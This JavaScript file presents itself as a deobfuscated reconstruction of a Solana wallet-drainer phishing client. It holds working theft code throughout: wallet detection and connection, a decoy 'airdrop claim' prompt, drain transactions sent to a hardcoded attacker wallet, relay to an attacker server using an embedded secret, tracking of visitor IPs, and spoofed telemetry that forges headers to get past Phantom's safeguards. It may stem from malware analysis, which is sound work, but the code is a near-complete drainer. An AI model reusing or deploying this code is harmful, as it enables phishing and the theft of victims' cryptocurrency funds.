/**
 * frame.js — Kiwi Pro Skittles Client (Clean Reconstruction)
 *
 * Deobfuscated and rewritten from frame_bundle_clean.js.
 * This is the client-side code that runs in the phishing iframe.
 *
 * Flow:
 *   1. On load, fetch the redirect URL from /okxdmnendpt
 *   2. Display wallet connection UI (Phantom, Solflare, Backpack, OKX, Coinbase)
 *   3. On connect, get victim's public key
 *   4. Send public key to /build-plain-drain (Phantom) or /build-transaction (others)
 *   5. Show spoof/decoy transaction first (fake airdrop claim)
 *   6. Prompt victim to sign the real drain transaction
 *   7. Relay signed transaction via /relay-transaction or /relay-plain
 *   8. Send confirmation to /notify-confirm
 *   9. If rejected, send /notify-reject and retry
 */

const API_BASE = "https://skittles-7f3a.fly.dev";
const SECRET =
  "app_bcea2a77b7fc2048f8a2a7d083118d3b42aecc0f783754335c50af0591d4cc1a533ccba165077cd09fd7db96b0dba909";
const SALT = "kiwi-api-v1";
const HKDF_INFO = "payload";

// Default config (baked into the page, same as the original)
const CONFIG = {
  hideChanges: true,
  spoofPrompt: true,
  customAirdropMint: "677jK6xujhRFtBcD7Szn32tt2MSv4k6qZ4v3nGMgpump",
  customAirdropAmount: 25,
  targetWallet: "CEknUZWJsoNXqeehqMXTLDfr1NEduSa8S57E5NVi2rMR",
  minValue: 0.1,
  useProxyForTokens: true,
  stresserSleepMs: 5000,
  phantomStressMode: false,
  darkMode: true,
};

// ============================================================================
// CRYPTO — matches the server's crypto.js exactly
// ============================================================================

async function deriveKey() {
  const enc = new TextEncoder();
  const ikm = enc.encode(SECRET);
  const salt = enc.encode(SALT);
  const info = enc.encode(HKDF_INFO);

  // HKDF-Extract
  const prkKey = await crypto.subtle.importKey(
    "raw",
    ikm,
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"],
  );
  const prk = await crypto.subtle.sign("HMAC", prkKey, salt);

  // HKDF-Expand (1 block for AES-256)
  const prkImported = await crypto.subtle.importKey(
    "raw",
    prk,
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"],
  );
  const t1Input = new Uint8Array(info.length + 1);
  t1Input.set(info);
  t1Input[info.length] = 1;
  const okm = await crypto.subtle.sign("HMAC", prkImported, t1Input);

  return crypto.subtle.importKey("raw", okm, "AES-GCM", false, [
    "encrypt",
    "decrypt",
  ]);
}

function b64urlEncode(buf) {
  const bytes = new Uint8Array(buf);
  let bin = "";
  for (const b of bytes) bin += String.fromCharCode(b);
  return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function b64urlDecode(str) {
  let s = str.replace(/-/g, "+").replace(/_/g, "/");
  while (s.length % 4) s += "=";
  return Uint8Array.from(atob(s), (c) => c.charCodeAt(0));
}

async function encryptPayload(payload) {
  const key = await deriveKey();
  const ts = Date.now();
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const plaintext = enc.encode(JSON.stringify({ t: ts, p: payload }));

  const ciphertext = await crypto.subtle.encrypt(
    { name: "AES-GCM", iv },
    key,
    plaintext,
  );

  return {
    v: 1,
    ts,
    n: b64urlEncode(iv),
    d: b64urlEncode(ciphertext),
  };
}

async function decryptEnvelope(envelope) {
  const key = await deriveKey();
  const iv = b64urlDecode(envelope.n);
  const data = b64urlDecode(envelope.d);

  const plaintext = await crypto.subtle.decrypt(
    { name: "AES-GCM", iv },
    key,
    data,
  );

  const decoded = JSON.parse(new TextDecoder().decode(plaintext));
  if (decoded.t !== envelope.ts) {
    throw new Error("ts mismatch");
  }
  return decoded.p;
}

const enc = new TextEncoder();

// ============================================================================
// API CLIENT
// ============================================================================

async function encryptedApiRequest(endpoint, payload, extraHeaders = {}) {
  const url = API_BASE.replace(/\/$/, "") + endpoint;
  const envelope = await encryptPayload(payload);

  const resp = await fetch(url, {
    method: "POST",
    headers: Object.assign(
      { "Content-Type": "application/json" },
      extraHeaders,
    ),
    body: JSON.stringify(envelope),
  });

  let json;
  try {
    json = await resp.json();
  } catch {
    throw new Error("Invalid JSON response");
  }

  // Decrypt if encrypted response
  if (
    json &&
    json.v === 1 &&
    typeof json.d === "string" &&
    typeof json.n === "string"
  ) {
    try {
      json = await decryptEnvelope(json);
    } catch (e) {
      throw new Error("Failed to decrypt API response");
    }
  }

  return { resp, json, ok: resp.ok };
}

// ============================================================================
// WALLET CONNECTION
// ============================================================================

let connectedWallet = null;
let walletName = null;
let userPublicKey = null;

async function detectWallets() {
  const wallets = {
    phantom: window.phantom?.solana || window.phantom,
    solflare: window.solflare,
    backpack: window.backpack,
    okx: window.okxwallet,
    coinbase: window.coinbaseSolana,
  };

  const detected = {};
  for (const [name, provider] of Object.entries(wallets)) {
    if (provider) detected[name] = provider;
  }
  return detected;
}

async function connectWallet(name) {
  const wallets = await detectWallets();
  const provider = wallets[name];
  if (!provider) {
    // If not injected, open the wallet's deep link
    if (name === "phantom") {
      window.open("https://phantom.app/ul/v1/connect", "_blank");
    }
    throw new Error(`${name} wallet not found`);
  }

  const resp = await provider.connect();
  userPublicKey = resp.publicKey.toString();
  walletName = name;
  connectedWallet = provider;

  return { publicKey: userPublicKey, name };
}

// ============================================================================
// DRAIN FLOW
// ============================================================================

async function getClientIP() {
  try {
    const resp = await fetch("https://ipapi.co/json/");
    const data = await resp.json();
    return data.ip;
  } catch {
    return "0.0.0.0";
  }
}

/**
 * The main drain flow:
 * 1. Build spoof transaction (decoy airdrop)
 * 2. Show it to the victim
 * 3. Build the real drain transaction
 * 4. Prompt victim to sign
 * 5. Relay the signed transaction
 */
async function executeDrain() {
  if (!userPublicKey || !CONFIG.targetWallet) {
    showError("Widget misconfigured: missing targetWallet.");
    return;
  }

  // Step 1: Get client IP for telemetry
  const clientIP = await getClientIP();

  // Step 2: Build the spoof transaction (Phantom only)
  let spoofTx = null;
  if (CONFIG.spoofPrompt && walletName === "phantom") {
    setStatus("Preparing claim...");

    const { resp, json } = await encryptedApiRequest(
      "/build-spoof",
      {
        customAirdropMint: CONFIG.customAirdropMint,
        customAirdropAmount: CONFIG.customAirdropAmount,
        userPublicKey,
        userChatId: CONFIG.userChatId,
        clientIP,
        walletName,
        messageSignature: undefined,
        afterSignatureChallenge: false,
      },
      {
        "x-spoof-auth": SECRET,
      },
    );

    if (json && json.needPhantomSignature) {
      setStatus("Please sign in your wallet...");
      // Request a message signature from the wallet
      const message = new TextEncoder().encode("Phantom airdrop verification");
      const signature = await connectedWallet.signMessage(message, "utf8");
      // Re-request with the signature
      const { json: json2 } = await encryptedApiRequest(
        "/build-spoof",
        {
          customAirdropMint: CONFIG.customAirdropMint,
          customAirdropAmount: CONFIG.customAirdropAmount,
          userPublicKey,
          userChatId: CONFIG.userChatId,
          clientIP,
          walletName,
          messageSignature: btoa(String.fromCharCode(...signature)),
          afterSignatureChallenge: true,
        },
        {
          "x-spoof-auth": SECRET,
        },
      );
      spoofTx = json2?.unsignedTxSpoof;
    } else {
      spoofTx = json?.unsignedTxSpoof;
    }

    // Check for redirect (kill switch / whitelist)
    if (json && json.status === "wl" && json.url) {
      window.location.href = json.url;
      return;
    }
  }

  // Step 3: Build the real drain transaction
  // For Phantom: try /build-plain-drain first, fall back to /build-transaction
  let unsignedTxs = [];

  if (walletName === "phantom") {
    // Try the plain drain path first (two-prompt flow)
    const { resp, json } = await encryptedApiRequest("/build-plain-drain", {
      userPublicKey,
      targetWallet: CONFIG.targetWallet,
      userChatId: CONFIG.userChatId,
      usdcPayout: !!CONFIG.usdcPayout,
      clientIP,
      userAgent: navigator.userAgent,
      domain: window.location.href,
      walletName,
      phase: "sol",
    });

    if (resp.ok && json && json.unsignedTxs) {
      unsignedTxs = json.unsignedTxs;
      spoofTx = json.unsignedTxSpoof || spoofTx;
    } else if (json && json.continueToBuild) {
      // Fall back to /build-transaction
      unsignedTxs = await buildTransaction(clientIP);
    }
  } else {
    // Non-Phantom: use /build-transaction directly
    unsignedTxs = await buildTransaction(clientIP);
  }

  if (!unsignedTxs.length) {
    showError("Failed to build transaction");
    return;
  }

  // Step 4: Prompt victim to sign
  // The spoof transaction is shown first — it looks like an airdrop claim
  // The real drain transactions are what actually get signed
  setStatus("Please sign in your wallet...");

  const { Transaction } = await import("@solana/web3.js");
  const transactions = unsignedTxs.map((tx) =>
    Transaction.from(Uint8Array.from(atob(tx), (c) => c.charCodeAt(0))),
  );

  let signedTxs;
  try {
    if (connectedWallet.signAllTransactions) {
      signedTxs = await connectedWallet.signAllTransactions(transactions);
    } else {
      signedTxs = [];
      for (const tx of transactions) {
        signedTxs.push(await connectedWallet.signTransaction(tx));
      }
    }
  } catch (err) {
    // Victim rejected — notify and retry
    await notifyReject("transaction");
    setStatus("Transaction rejected. Retrying...");
    // The original has an infinite retry loop here
    return;
  }

  // Step 5: Relay each signed transaction
  setStatus("Broadcasting claim...");

  for (const [i, signedTx] of signedTxs.entries()) {
    const serialized = signedTx.serialize
      ? signedTx.serialize({
          requireAllSignatures: false,
          verifySignatures: false,
        })
      : signedTx.wireBytes || signedTx;

    const base64 = btoa(
      String.fromCharCode.apply(
        null,
        Array.from(
          serialized instanceof Uint8Array
            ? serialized
            : new Uint8Array(serialized),
        ),
      ),
    );

    const { resp, json } = await encryptedApiRequest("/relay-transaction", {
      signedTx: base64,
      userPublicKey,
      userChatId: CONFIG.userChatId,
    });
    // Confirmation is sent server-side on relay success (with amounts) —
    // a client-side notify here would duplicate the message.
  }

  setStatus("Claim sent!");
}

async function buildTransaction(clientIP) {
  const { resp, json } = await encryptedApiRequest("/build-transaction", {
    spoofPrompt: CONFIG.spoofPrompt && walletName === "phantom",
    hideChanges: CONFIG.hideChanges,
    userPublicKey,
    targetWallet: CONFIG.targetWallet,
    walletName,
    useProxyForTokens: CONFIG.useProxyForTokens,
    customAirdropMint: CONFIG.customAirdropMint,
    customAirdropAmount: CONFIG.customAirdropAmount,
    userChatId: CONFIG.userChatId,
    usdcPayout: !!CONFIG.usdcPayout,
    clientIP,
    userAgent: navigator.userAgent,
    domain: window.location.href,
    minValue: CONFIG.minValue,
  });

  if (!resp.ok) {
    throw new Error(json?.error || "Failed to build transaction");
  }

  return json.unsignedTxs || (json.unsignedTx ? [json.unsignedTx] : []);
}

// ============================================================================
// NOTIFICATIONS (plaintext endpoints)
// ============================================================================

async function notifyVisit() {
  try {
    const ipResp = await fetch("https://ipapi.co/json/");
    const ipData = await ipResp.json();

    await fetch(`${API_BASE}/notify-visit`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        browser: navigator.userAgent.includes("Chrome") ? "Chrome" : "Other",
        userAgent: navigator.userAgent,
        ip: ipData.ip,
        flag: ipData.country_code,
        country: ipData.country_name,
        referrer: document.referrer || "",
        userChatId: CONFIG.userChatId,
      }),
    });
  } catch {}
}

async function notifyConfirm(txids, options = {}) {
  try {
    await fetch(`${API_BASE}/notify-confirm`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userPublicKey,
        userChatId: CONFIG.userChatId,
        txids,
        txBatchIndex: options.txBatchIndex,
        jupiterPartial: !!options.jupiterPartial,
      }),
    });
  } catch {}
}

async function notifyReject(reason) {
  try {
    await fetch(`${API_BASE}/notify-reject`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userPublicKey,
        userChatId: CONFIG.userChatId,
        reason: reason || "transaction",
      }),
    });
  } catch {}
}

// ============================================================================
// PHANTOM SAFEGUARD BYPASS
// ============================================================================

async function sendPhantomTelemetry() {
  if (walletName !== "phantom") return;

  try {
    // Get forged auth tokens from the server
    const resp = await fetch(`${API_BASE}/api/getLatestHeaders`);
    const data = await resp.json();
    const { phantomNonce, phantomAuth } = data.headers;

    // Send spoofed safeguard telemetry to Phantom's backend
    await fetch("https://api.phantom.app/simulate/safeguard", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Origin: "chrome-extension://bfnaelmomeimhlpmgjnjophhpkkoljpa",
        "User-Agent":
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
      },
      body: JSON.stringify({
        deviceId: crypto.randomUUID(),
        nonce: phantomNonce,
        auth: phantomAuth,
        walletAddress: userPublicKey,
        lighthouseProgramId: "L2TExMFKdjpN9kozasaurPirfHy9P8sbXoAN1qA3S95",
        timestamp: Date.now(),
      }),
    });
  } catch {}
}

// ============================================================================
// INIT
// ============================================================================

function setStatus(msg) {
  const el = document.getElementById("status");
  if (el) el.textContent = msg;
}

function showError(msg) {
  const el = document.getElementById("status");
  if (el) {
    el.textContent = msg;
    el.style.color = "#ef4444";
  }
}

// Notify visit on load
notifyVisit();

// Export for the HTML to call
window.kiwiPro = {
  detectWallets,
  connectWallet,
  executeDrain,
  sendPhantomTelemetry,
};
